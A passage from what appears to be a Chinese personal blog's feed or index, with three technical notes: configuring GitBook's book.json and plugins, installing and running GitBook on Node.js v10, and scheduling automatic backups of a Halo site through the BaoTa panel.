class="code"><pre><span class="line">&quot;description&quot; : &quot;记录Gitbook的配置和一些插件的使用&quot;</span><br></pre></td></tr></table></figure><h3 id="language-语言"><a href="#language-语言" class="headerlink" title="language 语言"></a>language 语言</h3><p>Gitbook使用的语言, 版本3.2.3中可选的语言如下：<br>en, ar, bn, cs, de, en, es, fa, fi, fr, he, it, ja, ko, no, pl, pt, ro, ru, sv, uk, vi, zh-hans, zh-tw<br>例如，配置使用简体中文,在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;language&quot; : &quot;zh-hans&quot;</span><br></pre></td></tr></table></figure><h3 id="links-链接"><a href="#links-链接" class="headerlink" title="links 链接"></a>links 链接</h3><p>在左侧导航栏添加链接信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;links&quot; : &#123;</span><br><span class="line">        &quot;sidebar&quot; : &#123;</span><br><span class="line">            &quot;Home&quot; : &quot;https://www.baidu.com&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="styles-样式"><a href="#styles-样式" class="headerlink" title="styles 样式"></a>styles 样式</h3><p>自定义页面样式， 默认情况下各generator对应的css文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;styles&quot;: &#123;</span><br><span class="line">    &quot;website&quot;: &quot;styles/website.css&quot;,</span><br><span class="line">    &quot;ebook&quot;: &quot;styles/ebook.css&quot;,</span><br><span class="line">    &quot;pdf&quot;: &quot;styles/pdf.css&quot;,</span><br><span class="line">    &quot;mobi&quot;: &quot;styles/mobi.css&quot;,</span><br><span class="line">    &quot;epub&quot;: &quot;styles/epub.css&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如使<code>&lt;h1&gt; &lt;h2&gt;</code>标签有下边框， 可以在<code>website.css</code>中设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h1 , h2&#123;</span><br><span class="line">    border-bottom: 1px solid #EFEAEA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插件列表-plugins"><a href="#插件列表-plugins" class="headerlink" title="插件列表 plugins"></a>插件列表 plugins</h3><p>配置使用的插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;plugins&quot;: [</span><br><span class="line">    &quot;-search&quot;,</span><br><span class="line">    &quot;back-to-top-button&quot;,</span><br><span class="line">    &quot;expandable-chapters-small&quot;,</span><br><span class="line">    &quot;insert-logo&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>其中<code>&quot;-search&quot;</code>中的 - 符号代表去除默认自带的插件<br>Gitbook默认自带有5个插件：</p><ul><li>highlight： 代码高亮</li><li>search： 导航栏查询功能（不支持中文）</li><li>sharing：右上角分享功能</li><li>font-settings：字体设置（最上方的”A”符号）</li><li>livereload：为GitBook实时重新加载</li></ul><h3 id="插件属性配置-pluginsConfig"><a href="#插件属性配置-pluginsConfig" class="headerlink" title="插件属性配置 pluginsConfig"></a>插件属性配置 pluginsConfig</h3><p>配置插件的属性<br>例如配置<code>insert-logo</code>的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;pluginsConfig&quot;: &#123;</span><br><span class="line">    &quot;insert-logo&quot;: &#123;</span><br><span class="line">      &quot;url&quot;: &quot;images/logo.png&quot;,</span><br><span class="line">      &quot;style&quot;: &quot;background: none; max-height: 30px; min-height: 30px&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="GitBook常见插件"><a href="#GitBook常见插件" class="headerlink" title="GitBook常见插件"></a>GitBook常见插件</h2><p>添加GitBook常见插件首先要在项目目录文件夹下添加book.json文件，然后在book.json中输入对应内容，并在项目目录下控制台输入gitbook install即可安装。</p><h3 id="back-to-top-button-回到顶部"><a href="#back-to-top-button-回到顶部" class="headerlink" title="back-to-top-button 回到顶部"></a>back-to-top-button 回到顶部</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;plugins&quot;: [</span><br><span class="line">         &quot;back-to-top-button&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="toggle-chapters-折叠目录"><a href="#toggle-chapters-折叠目录" class="headerlink" title="toggle-chapters 折叠目录"></a>toggle-chapters 折叠目录</h3><p>默认只在目录导航中显示章的标题，而不会显示小节的标题，点击每一章或者每一节会显示当前章或节的子目录，如果有的话，但是同时会收起其它之前展开的章节。<br>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;plugins&quot;: [&quot;toggle-chapters&quot;]</span><br></pre></td></tr></table></figure><h3 id="hide-element-隐藏元素"><a href="#hide-element-隐藏元素" class="headerlink" title="hide-element 隐藏元素"></a>hide-element 隐藏元素</h3><p>可以用来隐藏不想看到的元素，例如隐藏GitBook默认提示：Published with GitBook ，在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;plugins&quot;: [</span><br><span class="line">    &quot;hide-element&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;pluginsConfig&quot;: &#123;</span><br><span class="line">    &quot;hide-element&quot;: &#123;</span><br><span class="line">        &quot;elements&quot;: [&quot;.gitbook-link&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="tbfed-pagefooter-添加页脚"><a href="#tbfed-pagefooter-添加页脚" class="headerlink" title="tbfed-pagefooter 添加页脚"></a>tbfed-pagefooter 添加页脚</h3><p>在每个文章下面标注版权信息和文章时间。<br>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;plugins&quot;: [</span><br><span class="line">    &quot;tbfed-pagefooter&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;pluginsConfig&quot;: &#123;</span><br><span class="line">    &quot;tbfed-pagefooter&quot;: &#123;</span><br><span class="line">        &quot;copyright&quot;: &quot;Copyright &amp;copy ruarua 2020&quot;,</span><br><span class="line">        &quot;modify_label&quot;: &quot;该文章修订时间：&quot;,</span><br><span class="line">        &quot;modify_format&quot;: &quot;YYYY-MM-DD&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="sharing-plus-分享页面"><a href="#sharing-plus-分享页面" class="headerlink" title="sharing-plus 分享页面"></a>sharing-plus 分享页面</h3><p>GitBook默认只有Facebook、Google+、Twiter、Weibo、Instapaper，插件可以有更多分享方式，也可关闭指定分享方式。<br>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;plugins&quot;: [</span><br><span class="line">    &quot;-sharing&quot;,&quot;sharing-plus&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;pluginsConfig&quot;: &#123;</span><br><span class="line">    &quot;sharing&quot;: &#123;</span><br><span class="line">          &quot;facebook&quot;: &quot;false&quot;,</span><br><span class="line">          &quot;google&quot;: &quot;false&quot;,</span><br><span class="line">          &quot;twiter&quot;: &quot;false&quot;,</span><br><span class="line">          &quot;qq&quot;: &quot;true&quot;,</span><br><span class="line">        &quot;all&quot;: [</span><br><span class="line">            &quot;facebook&quot;,&quot;google&quot;,&quot;twiter&quot;,&quot;qq&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="search-pro-高级搜索"><a href="#search-pro-高级搜索" class="headerlink" title="search-pro 高级搜索"></a>search-pro 高级搜索</h3><p>搜索支持中英文，准确率更高。<br>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;plugins&quot;: [</span><br><span class="line">    &quot;-lunr&quot;,&quot;-search&quot;,&quot;search-pro&quot;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><h3 id="insert-logo-插入logo"><a href="#insert-logo-插入logo" class="headerlink" title="insert-logo 插入logo"></a>insert-logo 插入logo</h3><p>在左侧导航栏上方插入logo。<br>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;plugins&quot;: [</span><br><span class="line">    &quot;insert-logo&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;pluginsConfig&quot;: &#123;</span><br><span class="line">    &quot;insert-logo&quot;: &#123;</span><br><span class="line">        &quot;url&quot;: &quot;../assets/logo.png&quot;,</span><br><span class="line">        &quot;style&quot;: &quot;background: none&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="custom-favicon-修改标题栏图标"><a href="#custom-favicon-修改标题栏图标" class="headerlink" title="custom-favicon 修改标题栏图标"></a>custom-favicon 修改标题栏图标</h3><p>设置浏览器选项卡标题栏的小图标。<br>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;plugins&quot;: [</span><br><span class="line">    &quot;custom-favicon&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;pluginsConfig&quot;: &#123;</span><br><span class="line">    &quot;favicon&quot;: &quot;assets/favicon.ico&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="book-json-全部代码"><a href="#book-json-全部代码" class="headerlink" title="book.json 全部代码"></a>book.json 全部代码</h2><p>这里是只是列了几个做个师范，可根据自己的需求选择安装的插件，并非全都要装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;title&quot; : &quot;骑士指南&quot;,</span><br><span class="line">  &quot;author&quot; : &quot;公爵&quot;,</span><br><span class="line">  &quot;description&quot; : &quot;记录Gitbook的配置和一些插件的使用&quot;,</span><br><span class="line">  &quot;language&quot; : &quot;zh-hans&quot;,</span><br><span class="line">  &quot;plugins&quot;: [</span><br><span class="line">    &quot;toggle-chapters&quot;,</span><br><span class="line">    &quot;insert-logo&quot;,</span><br><span class="line">    &quot;-sharing&quot;,</span><br><span class="line">    &quot;hide-element&quot;,</span><br><span class="line">    &quot;tbfed-pagefooter&quot;,</span><br><span class="line">    &quot;-lunr&quot;,</span><br><span class="line">    &quot;-search&quot;,</span><br><span class="line">    &quot;search-pro&quot;,</span><br><span class="line">    &quot;custom-favicon&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;pluginsConfig&quot;: &#123;</span><br><span class="line">    &quot;tbfed-pagefooter&quot;: &#123;</span><br><span class="line">        &quot;copyright&quot;: &quot;Copyright &amp;copy ruarua 2020&quot;,</span><br><span class="line">        &quot;modify_label&quot;: &quot;该文章修订时间：&quot;,</span><br><span class="line">        &quot;modify_format&quot;: &quot;YYYY-MM-DD&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;hide-element&quot;: &#123;</span><br><span class="line">        &quot;elements&quot;: [&quot;.gitbook-link&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;insert-logo&quot;: &#123;</span><br><span class="line">        &quot;url&quot;: &quot;../assets/logo.jpg&quot;,</span><br><span class="line">        &quot;style&quot;: &quot;background: none&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;favicon&quot;: &quot;assets/favicon.ico&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>当按配置方法配置完成后，就可以愉快的开始使用gitbook了</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cnblogs.com/mingyue5826/p/10307051.html#2121-tbfed-pagefooter-%E9%A1%B5%E9%9D%A2%E6%B7%BB%E5%8A%A0%E9%A1%B5%E8%84%9A%EF%BC%88%E5%86%85%E5%AE%B9%E5%B0%91%EF%BC%89">GitBook插件整理</a></p><p><a href="http://caibaojian.com/gitbook/">GitBook文档（中文版）</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> gitbook </tag>
            
            <tag> 插件 </tag>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitBook安装使用笔记（一）安装部署</title>
      <link href="/79.html"/>
      <url>/79.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="http://caibaojian.com/gitbook/">GitBook</a> 是一个使用 Git 和 Markdown 来构建书籍的工具。它可以把你的书本生成为许多格式：PDF，ePub，mobi，或者成为一个网站。</p><p>GitBook工具链是开源并且完全免费的，它的源码可以在 <a href="https://github.com/GitbookIO/gitbook">GitHub</a> 上获取。</p><blockquote><p>注意: 截止到目前的 Gitbook V3.2.3版本，需要使用NodeJs的v10+版本，否则会产生各种报错。这里建议下载v10.24.1版本，官网最新版本我试了也是不行的。</p></blockquote><h1 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h1><p>1、首先在宝塔的软件商店，安装Node.js版本管理器，具体哪个版本看你需要，我这边安装的是1.6<br><img src="https://cos.gjcloak.xyz/file/1.png" alt="Test" title="Test"></p><p>2、进入Node.js版本管理器的设置界面，版本安装v10.24.1，然后命令行版本选择你安装的版本，registry源选择淘宝源或者官方源<br><img src="https://cos.gjcloak.xyz/file/image-1652350507021.png" alt="image-1652350507021" title="image-1652350507021"></p><p>3、安装好了nodejs之后，输入命令检查是否安装 成功。如果命令无效，检查一下环境变量是否配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ node -v                                                </span><br><span class="line">v10.24.1</span><br></pre></td></tr></table></figure><h1 id="安装GitBook"><a href="#安装GitBook" class="headerlink" title="安装GitBook"></a>安装GitBook</h1><p>接下来使用<code>npm</code>命令安装<code>gitbook-cli</code>。它是在同一系统上安装和使用多个版本的GitBook的实用程序。它将自动安装所需版本的GitBook程序。（可能需要一些时间，耐心等待就行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gitbook-cli -g</span><br></pre></td></tr></table></figure><p>通过<code>gitbook -V</code>命令查看是否安装成功（可能需要一些时间，耐心等待就行）。<strong>V是大写的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook -V</span><br></pre></td></tr></table></figure><h1 id="Gitbook基本使用"><a href="#Gitbook基本使用" class="headerlink" title="Gitbook基本使用"></a>Gitbook基本使用</h1><h2 id="Gitbook文档目录结构"><a href="#Gitbook文档目录结构" class="headerlink" title="Gitbook文档目录结构"></a>Gitbook文档目录结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GitBook 基本的目录结构如下所示</span><br><span class="line">- book.json        //电子书的配置文件</span><br><span class="line">- README.md        //电子书的主要说明文件</span><br><span class="line">- SUMMARY.md        //电子书的目录</span><br><span class="line">- chapter-1/        //电子书的章节1文件夹(chapter-1是文件夹名称，可以自定义)</span><br><span class="line">    - README.md        //章节1的说明文件</span><br><span class="line">     - 文档1.md        //章节下面的小节1</span><br><span class="line">    - 文档2.md        //章节下面的小节2</span><br><span class="line">- chapter-2/        //电子书的章节2文件夹(chapter-2是文件夹名称，可以自定义)</span><br><span class="line">    - README.md        //章节2的说明文件</span><br><span class="line">     - 文档1.md        //章节下面的小节2</span><br><span class="line">    - 文档2.md        //章节下面的小节2</span><br></pre></td></tr></table></figure><h2 id="Gitbook初始化"><a href="#Gitbook初始化" class="headerlink" title="Gitbook初始化"></a>Gitbook初始化</h2><p>新建一个文件夹如<code>gitbook_test</code>，使用cd命令进入到该文件夹下，在该文件夹下进行初始化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook init</span><br></pre></td></tr></table></figure><p>会自动在目录中生成两个文件，一个是主要说明文件，一个是目录文件<br><img src="https://cos.gjcloak.xyz/file/image-1652355609755.png" alt="image-1652355609755" title="image-1652355609755"></p><h2 id="编写目录"><a href="#编写目录" class="headerlink" title="编写目录"></a>编写目录</h2><p>打开SUMMARY.md文件编写目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Summary</span><br><span class="line">* [教程导读](README.md)</span><br><span class="line">* [day01—环境搭建&amp;快速入门](day01—Java开发环境/README.md)</span><br><span class="line">    * [环境搭建](day01—Java开发环境/环境搭建.md)</span><br><span class="line">    * [入门案例](day01—Java开发环境/基础语法.md)</span><br><span class="line">    * [基础语法](day01—Java开发环境/入门案例.md)</span><br><span class="line">    * [课后练习](day01—Java开发环境/课后练习.md)</span><br><span class="line">* [day02—类型转换&amp;运算符](day02—类型转换&amp;运算符/README.md)</span><br><span class="line">    * [类型转换](day02—类型转换&amp;运算符/类型转换.md)</span><br><span class="line">    * [运算符](day02—类型转换&amp;运算符/运算符.md)</span><br><span class="line">    * [if语句](day02—类型转换&amp;运算符/if语句.md)</span><br></pre></td></tr></table></figure><h2 id="生成各小节md文件"><a href="#生成各小节md文件" class="headerlink" title="生成各小节md文件"></a>生成各小节md文件</h2><p>编写好目录之后，在<code>gitbook_test</code>文件夹下，再次使用<code>gitbook init</code>命令生成个目录中的各小节md文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook init</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1652355892397.png" alt="image-1652355892397" title="image-1652355892397"><br><img src="https://cos.gjcloak.xyz/file/image-1652355922923.png" alt="image-1652355922923" title="image-1652355922923"><br><img src="https://cos.gjcloak.xyz/file/image-1652355945462.png" alt="image-1652355945462" title="image-1652355945462"></p><h2 id="编译生成静态网页"><a href="#编译生成静态网页" class="headerlink" title="编译生成静态网页"></a>编译生成静态网页</h2><p>将会在<code>gitbook_test</code>目录下生成一个<code>_book</code>文件夹，这就是我们的一个静态站点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook build</span><br></pre></td></tr></table></figure><h2 id="编译并预览静态网页"><a href="#编译并预览静态网页" class="headerlink" title="编译并预览静态网页"></a>编译并预览静态网页</h2><p>先编译生成静态站点，并且开启一个4000端口服务，在浏览器中使用<code>localhost:4000</code>进行访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook serve</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1652356123590.png" alt="image-1652356123590" title="image-1652356123590"></p><h1 id="Gitbook配置文件"><a href="#Gitbook配置文件" class="headerlink" title="Gitbook配置文件"></a>Gitbook配置文件</h1><p>Gitbook有一个配置文件<code>book.json</code>，在该配置文件中可以配置各种插件，来美化页面的显示和交互效果。 由于插件比较多，这里把我常用配置和插件已经写好了，直接粘贴即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;title&quot;: &quot;骑士指南&quot;,</span><br><span class="line">    &quot;description&quot;: &quot;要想成为强者,决不能绕过挡道的荆棘,也不能回避风雨的冲刷&quot;,</span><br><span class="line">    &quot;author&quot;: &quot;公爵&quot;,</span><br><span class="line">    &quot;output.name&quot;: &quot;site&quot;,</span><br><span class="line">    &quot;language&quot;: &quot;zh-hans&quot;,</span><br><span class="line">    &quot;plugins&quot;: </span><br><span class="line">    [</span><br><span class="line">        &quot;toggle-chapters&quot;,</span><br><span class="line">        &quot;hide-element&quot;,</span><br><span class="line">        &quot;tbfed-pagefooter&quot;,</span><br><span class="line">        &quot;-lunr&quot;,&quot;-search&quot;,&quot;search-pro&quot;,</span><br><span class="line">        &quot;insert-logo&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;pluginsConfig&quot;: &#123;</span><br><span class="line">        &quot;hide-element&quot;: &#123;</span><br><span class="line">            &quot;elements&quot;: [&quot;.gitbook-link&quot;]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;tbfed-pagefooter&quot;: &#123;</span><br><span class="line">                &quot;copyright&quot;: &quot;Copyright &amp;copy 公爵 2022&quot;,</span><br><span class="line">                &quot;modify_label&quot;: &quot;该文章修订时间：&quot;,</span><br><span class="line">                &quot;modify_format&quot;: &quot;YYYY-MM-DD&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;insert-logo&quot;: &#123;</span><br><span class="line">                &quot;url&quot;: &quot;https://cos.gjcloak.xyz/2022/04/28/6269f3340b765.png&quot;,</span><br><span class="line">                &quot;style&quot;: &quot;background: none&quot;</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写好配置文件之后，需要执行命令来安装插件（这里下载插件需要一点时间，耐心等待即可）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitbook install</span><br></pre></td></tr></table></figure><h1 id="常见问题说明"><a href="#常见问题说明" class="headerlink" title="常见问题说明"></a>常见问题说明</h1><p>1、提示找不到命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-bash:gitbook:command not found</span><br></pre></td></tr></table></figure><p>解决它很简单，在root目录下，有个<code>.bash_profile</code> 文件，在里面加上下面这句话即可解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:$JAVA_HOME:$BISON_HOME:$MAVEN_HOME/bin:$RBMQ_HOME:$MYSQL_HOME:$PHANTOMJS_HOME:$(npm prefix -g)/bin</span><br></pre></td></tr></table></figure><p>2、安装 nodejs、npm和 gitbook的时候，会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Installing GitBook 3.2.3</span><br><span class="line">/usr/local/lib/node_modules/gitbook-cli/node_modules/npm/node_modules/graceful-fs/polyfills.js:287</span><br><span class="line">if (cb) cb.apply(this, arguments)</span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">TypeError: cb.apply is not a function</span><br><span class="line">at /usr/local/lib/node_modules/gitbook-cli/node_modules/npm/node_modules/graceful-fs/polyfills.js:287:18</span><br><span class="line">at</span><br></pre></td></tr></table></figure><p>这是因为gitbook因为nodejs版本不匹配导致安装报错，nodejs需要使用10.x版本，才不会报错</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>到这里就完成了基础的gitbook部署</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gitbook </tag>
            
            <tag> 电子书 </tag>
            
            <tag> 静态博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>halo整站自动备份</title>
      <link href="/78.html"/>
      <url>/78.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为halo只有整站备份，但没有自动备份，为了避免每次人工进行备份，所以今天弄了下自动备份,超级简单的，推荐使用宝塔</p><h2 id="使用环境"><a href="#使用环境" class="headerlink" title="使用环境"></a>使用环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">宝塔面板</span><br><span class="line">Ubuntu Server 18.04.1 LTS 64bit</span><br></pre></td></tr></table></figure><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>进入宝塔的计划任务，如下图设置</p><p><img src="https://cos.gjcloak.xyz/file/image-1652165417181.png" alt="image-1652165417181" title="image-1652165417181"></p><p><strong>任务类型</strong>：备份目录</p><p><strong>任务名称</strong>：这个随意</p><p><strong>执行周期</strong>：看需要多久设置一次，支持月、星期、天、小时、分钟的设置</p><p><strong>备份目录</strong>：选择你.halo的工作目录</p><p><strong>备份地点</strong>则是服务器的backup文件夹（这个可以在面板设置进行变更）</p><p><strong>保留最新</strong>多少份就看个人需求</p><p><strong>备份提醒</strong>：就是完成备份是否需要通知</p><p><strong>排除规则</strong>：可以设置哪些不需要备份，一行一条规则</p><p>点击添加任务即可</p><p><img src="https://cos.gjcloak.xyz/file/image-1652165759026.png" alt="image-1652165759026" title="image-1652165759026"></p><p>可以在日志处查看执行情况</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>到这里就完成了自动备份，炒鸡简单，希望能帮助到大家。<br>如果没有安装宝塔，也可以通过参考 无宝塔安装 进行配置。</p><h1 id="无宝塔安装"><a href="#无宝塔安装" class="headerlink" title="无宝塔安装"></a>无宝塔安装</h1><p><a href="https://blog.csdn.net/redrose2008/article/details/90417033">CentOS Linux自动备份文件按日期备份</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> halo </tag>
            
            <tag> 备份 </tag>
            
            <tag> 自动 </tag>
            
        </tags>
      
